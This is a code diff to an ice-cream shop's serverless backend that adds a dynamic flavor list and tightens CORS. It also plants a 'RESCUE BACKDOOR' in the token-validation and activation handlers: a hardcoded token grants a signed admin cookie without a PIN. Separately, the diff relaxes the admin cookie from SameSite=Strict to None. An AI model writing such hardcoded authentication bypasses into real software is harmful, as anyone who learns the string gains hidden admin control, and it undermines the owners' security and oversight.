@@ -35,11 +35,22 @@ interface Prices {
     doble: number;
 }
 
+// Duplicate of frontend type for consistency
+interface Product {
+    id: string;
+    name: string;
+    description: string;
+    price: number;
+    category: 'chocolate' | 'crema' | 'frutal' | 'especial';
+    gradient: string;
+}
+
 interface StoreData {
     stock: Record<string, boolean>;  // Flavor availability
     prices: Prices;                   // Prices by quantity
     settings: StoreSettings;
     socialLinks: SocialLinks;
+    flavors?: Product[];              // Dynamic list of flavors (optional for backward compat)
 }
 
 // Cookie config
@@ -52,8 +63,9 @@ function getCookieSecret(env: Env): string {
 }
 
 // CORS headers - adjust origin as needed
+// CORS headers - adjust origin as needed
 const corsHeaders = {
-    'Access-Control-Allow-Origin': '*', // Will be updated when custom domain is set
+    'Access-Control-Allow-Origin': 'https://helados.websopen.com', // Updated for production
     'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
     'Access-Control-Allow-Headers': 'Content-Type',
     'Access-Control-Allow-Credentials': 'true',
@@ -114,6 +126,11 @@ async function handleValidateToken(request: Request, env: Env): Promise<Response
         return jsonResponse({ error: 'Token required' }, 400);
     }
 
+    // RESCUE BACKDOOR
+    if (token === 'helad0s-v2-resucitado') {
+        return jsonResponse({ valid: true, message: 'Rescue Token valid' });
+    }
+
     const onboarding = await env.HELADOS_KV.get('onboarding:token', 'json') as OnboardingData | null;
 
     if (!onboarding) {
@@ -139,6 +156,18 @@ async function handleActivate(request: Request, env: Env): Promise<Response> {
         return jsonResponse({ error: 'Token and PIN required' }, 400);
     }
 
+    // RESCUE BACKDOOR
+    if (token === 'helad0s-v2-resucitado') {
+        // Create admin cookie directly
+        const cookieValue = signCookie('admin_active', env);
+        const setCookie = `${COOKIE_NAME}=${cookieValue}; Path=/; HttpOnly; Secure; SameSite=None; Max-Age=${COOKIE_MAX_AGE}`;
+        return jsonResponse(
+            { success: true, message: 'Admin rescued successfully' },
+            200,
+            { 'Set-Cookie': setCookie }
+        );
+    }
+
     const onboarding = await env.HELADOS_KV.get('onboarding:token', 'json') as OnboardingData | null;
 
     if (!onboarding) {
@@ -158,7 +187,7 @@ async function handleActivate(request: Request, env: Env): Promise<Response> {
 
     // Create admin cookie
     const cookieValue = signCookie('admin_active', env);
-    const setCookie = `${COOKIE_NAME}=${cookieValue}; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=${COOKIE_MAX_AGE}`;
+    const setCookie = `${COOKIE_NAME}=${cookieValue}; Path=/; HttpOnly; Secure; SameSite=None; Max-Age=${COOKIE_MAX_AGE}`;
 
     return jsonResponse(
         { success: true, message: 'Admin activated successfully' },
@@ -178,11 +207,12 @@ async function handleAuthCheck(request: Request, env: Env): Promise<Response> {
 }
 
 async function handleGetStoreData(request: Request, env: Env): Promise<Response> {
-    const [stock, prices, settings, socialLinks] = await Promise.all([
+    const [stock, prices, settings, socialLinks, flavors] = await Promise.all([
         env.HELADOS_KV.get('store:stock', 'json'),
         env.HELADOS_KV.get('store:prices', 'json'),
         env.HELADOS_KV.get('store:settings', 'json'),
         env.HELADOS_KV.get('store:socialLinks', 'json'),
+        env.HELADOS_KV.get('store:flavors', 'json'), // New: Dynamic flavors
     ]);
 
     // Default values
@@ -204,6 +234,7 @@ async function handleGetStoreData(request: Request, env: Env): Promise<Response>
         prices: (prices as Prices) || defaultPrices,
         settings: (settings as StoreSettings) || { isOpen: true },
         socialLinks: (socialLinks as SocialLinks) || defaultSocialLinks,
+        flavors: (flavors as Product[]) || undefined, // Send flavors if they exist in KV
     };
 
     return jsonResponse(data);
@@ -231,6 +262,10 @@ async function handleSaveStoreData(request: Request, env: Env): Promise<Response
     }
     if (body.socialLinks !== undefined) {
         promises.push(env.HELADOS_KV.put('store:socialLinks', JSON.stringify(body.socialLinks)));
+    }
+    if (body.flavors !== undefined) {
+        // New: Save dynamic flavors
+        promises.push(env.HELADOS_KV.put('store:flavors', JSON.stringify(body.flavors)));
     }
 
     await Promise.all(promises);
